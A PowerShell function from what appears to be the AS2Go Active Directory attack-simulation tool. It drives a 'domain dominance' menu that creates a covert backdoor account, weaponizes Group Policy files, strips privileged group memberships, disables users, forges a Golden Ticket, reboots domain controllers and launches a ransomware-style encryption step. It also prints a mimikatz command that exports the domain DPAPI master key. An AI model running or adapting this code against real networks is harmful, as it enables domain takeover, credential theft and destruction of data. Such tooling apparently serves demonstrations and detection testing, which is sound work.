function Start-Phase12DomainCompromise {

    ################################################################################
    #####                                                                      ##### 
    #####    Phase 12 Domain Comprommise
    #####                                                                      #####
    ################################################################################

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host #####################
  
    $nextAnswer = "B"

    Do {
        Invoke-Output -Type Header -Message "Domain Dominance & Persistence - Select a Final Action:"

        Write-Host "   B " -ForegroundColor Yellow -NoNewline; Write-Host "- Establish persistent domain access through a covert backdoor account"
        Write-Host "   T " -ForegroundColor Yellow -NoNewline; Write-Host "- Weaponize Group Policy Template (GPT) files for domain-wide compromise"
        Write-Host "   P " -ForegroundColor Yellow -NoNewline; Write-Host "- Purge all privileged group memberships to grant exclusive control to the backdoor account"
        Write-Host "   U " -ForegroundColor Yellow -NoNewline; Write-Host "- Disable user accounts or enforce password resets (retain backdoor control)"
        Write-Host "   E " -ForegroundColor Yellow -NoNewline; Write-Host "- Encrypt critical Domain Controller assets for strategic leverage"
        Write-Host "   K " -ForegroundColor Yellow -NoNewline; Write-Host "- Extract the DPAPI master key for credential and secret recovery"
        Write-Host "   G " -ForegroundColor Yellow -NoNewline; Write-Host "- Forge a Golden Ticket to achieve unrestricted Kerberos dominance"
        Write-Host "   R " -ForegroundColor Yellow -NoNewline; Write-Host "- Trigger coordinated reboot across accessible Domain Controllers"
        Write-Host "`n   X " -ForegroundColor Yellow -NoNewline; Write-Host "- Exit AS2Go"



        If ($UnAttended) {
            $answer = $nextAnswer
        }
        else {

            $title = "Domain Dominance & Persistence"
            $message = "Select the action to execute."
            $Options = @(
                [pscustomobject] @{
                    Label = "&Backdoor"
                    Help  = "Establish persistent domain access through a covert backdoor account"
                    Value = "B"
                },
                [pscustomobject] @{
                    Label = "GP&T"
                    Help  = "Weaponize Group Policy Template (GPT) files for domain-wide compromise"
                    Value = "T"
                },
                [pscustomobject] @{
                    Label = "&Purge"
                    Help  = "Purge all privileged group memberships to grant exclusive control to the backdoor account"
                    Value = "P"
                },
                [pscustomobject] @{
                    Label = "&User Account"
                    Help  = "Disable user accounts or enforce password resets (retain backdoor control)"
                    Value = "U"
                },
                [pscustomobject] @{
                    Label = "Master &Key"
                    Help  = "Extract the DPAPI master key for credential and secret recovery"
                    Value = "K"
                },
                [pscustomobject] @{
                    Label = "&Golden Ticket"
                    Help  = "Forge a Golden Ticket to achieve unrestricted Kerberos dominance"
                    Value = "G"
                },
                [pscustomobject] @{
                    Label = "&Encrypt"
                    Help  = "Encrypt critical Domain Controller assets for strategic leverage"
                    Value = "E"
                },
                [pscustomobject] @{
                    Label = "&Reboot"
                    Help  = "Trigger coordinated reboot across accessible Domain Controllers"
                    Value = "R"
                },
                [pscustomobject] @{
                    Label = "E&xit"
                    Help  = "Exit AS2Go."
                    Value = "X"
                }
            )
            $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title
        }

        switch ($answer) {

            "B" {
                If (-not $SkipClearHost) { Clear-Host }
                Invoke-Output -T Header -M "Create a backdoor account with elevated group memberships for persistence"
        
                If ($UnAttended) {
                    $answer = $Script:Yes 
                }
                else {
                    $answer = Show-DecisionPrompt
                }
    
                If ($answer -eq $Script:Yes) {
                    New-BackDoorUser
                    #If ($UnAttended) { Start-Sleep 2 } else { Pause }
                }
                $nextAnswer = "T"
                $repeat = $Script:Yes 
            }
            "P" {
                If (-not $SkipClearHost) { Clear-Host }
                Invoke-Output -T Header -M "Purge all privileged group memberships"
                $answer = $Script:Yes
                
                If ($UnAttended) {
                    $answer = $Script:Yes 
                }
    
                If ($answer -eq $Script:Yes) {
                    Invoke-GroupManipulation
                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
                }
                $NextStep = "T"
                $repeat = $Script:Yes 
            }
            "T" {
                If (-not $SkipClearHost) { Clear-Host }
                Invoke-Output -T Header -M "Manipulate Group Policy Templates (GPT) files"
        
                If ($UnAttended) {
                    $answer = $Script:Yes 
                }
                else {
                    $answer = Show-DecisionPrompt
                }
    
                If ($answer -eq $Script:Yes) {

                    $TargetGPO = Get-GPOLinkedOnDomain
                    if ([string]::IsNullOrEmpty($TargetGPO)) {
                        Invoke-Output -Type CodeSnippet -Message "Domain Selection cancled by user"
                    }
                    else {
                        New-GPOManipulation -ID $TargetGPO.ID.Guid -name $TargetGPO.DisplayName -domainDNS $TargetGPO.DomainDNS -server $TargetGPO.Server
                    }
                }
                $nextAnswer = "U"
                $repeat = $Script:Yes  
            }
            "U" {
                If (-not $SkipClearHost) { Clear-Host }
                Invoke-Output -T Header -M "Disable user accounts or/and enforce password resets"
      
                $EmojiIcon = [System.Convert]::toInt32("1F600", 16)
                $Smily = [System.Char]::ConvertFromUtf32($EmojiIcon)
    
        
                Write-host "  ... will ignore your new backdoor user " -NoNewline
                Write-host $global:BDUser -ForegroundColor $Script:FGCHighLight -NoNewline
                Write-Host " - $Smily"
            
                If ($UnAttended) {
                    $answer = $Script:Yes 
                }
                else {
                    $question = "Do you want to run these steps - Y or N? Default "
                    $answer = Get-Answer -question $question -defaultValue $Script:Yes
                }
    
                If ($answer -eq $Script:Yes) {
                    #$Script:ASSearchBase = Get-ASConfig -Setting "MySearchBase"
                    New-UserManipulation
                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
                } 
                $NextStep = "T"
                $repeat = $Script:Yes   
            }
            "G" {
                If (-not $SkipClearHost) { Clear-Host }

                Invoke-Output -T Header -M "Forge a Golden Ticket to achieve unrestricted Kerberos dominance"
                Invoke-output -T Bullet -M "Step 1: Dump the NTLM Hash for 'krbtgt' account"
                Invoke-output -T Bullet -M "Step 2: Forge Golden Ticket"
                Invoke-output -T Bullet -M "Step 3: Use the Golden Ticket to achieve unrestricted Kerberos dominance"
    
                If ($UnAttended) {
                    $answer = $Script:No 
                }
                else {
                    $answer = Show-DecisionPrompt
                }
    
                If ($answer -eq $Script:Yes) {
                    Invoke-GoldenTicket
                } 
                $repeat = $Script:Yes  
            }
            "E" {
                #region  Step - ran ransomware attack? 
                #Pause
                If (-not $SkipClearHost) { Clear-Host }
                Invoke-Output -T Header -M "Encrypt critical Domain Controller assets for strategic leverage"
    
                If ($UnAttended) {
                    $answer = $Script:Yes 
                }
                else {
                    $question = "Do you want to run this attack - Y or N? Default "
                    #$answer = Get-Answer -question $question -defaultValue $Script:Yes
                    $answer = $Script:Yes 
                }

                If ($answer -eq $Script:Yes) {
                    #run functions
                    New-RansomwareAttack -BackupShare $Script:ASOfflineDITFile
                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
                }
                #endregion  Step - ran ransomware attack?
                $repeat = $Script:Yes   
            }
            "K" {

                If (-not $SkipClearHost) { Clear-Host }

                Invoke-output -T Header -M "Export DATA PROTECTION API master key"
                Invoke-output -T Bullet -M "Attackers can use the master key to decrypt ANY secret`n    protected by DPAPI on all domain-joined machines"
                Invoke-Output -Type CodeSnippet -Message "Command:"

                Write-Highlight -Text ".\mimikatz.exe ", """cd $Script:DefautExfiltrationFolder"" ", """privilege::", "debug", """ ""lsadump::", "backupkeys ", "/system:", "$Script:ASDC.$Script:ASFQDN", " /export", """ ""exit"""  `
                    -Color $fgcC, $fgcV, $fgcF, $fgcV, $fgcF, $fgcV, $fgcS, $fgcV, $fgcS, $fgcF
                Write-Host  ""

                If ($UnAttended) {
                    $answer = $Script:Yes 
                }
                else {
                    $answer = Show-DecisionPrompt
                }

                If ($answer -eq $Script:Yes) {
                    Start-ExportDPAPIMasterKey
                }

                $repeat = $Script:Yes      
            }
            "R" {
                #Pause
                If (-not $SkipClearHost) { Clear-Host }
                Invoke-Output -T Header -M "Trigger coordinated reboot across accessible Domain Controllers"
                Restart-VictimMachines
            }
            "X" {
                Stop-AS2GoDemo -NextStepReboot $Script:No
                $repeat = $Script:No
            }

            default {
                Write-Host "out of scope"
                $repeat = $Script:Yes  
            }
        }
            





        If (-not $SkipClearHost) { Clear-Host }
  
    } Until ($repeat -eq $Script:No)

    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}
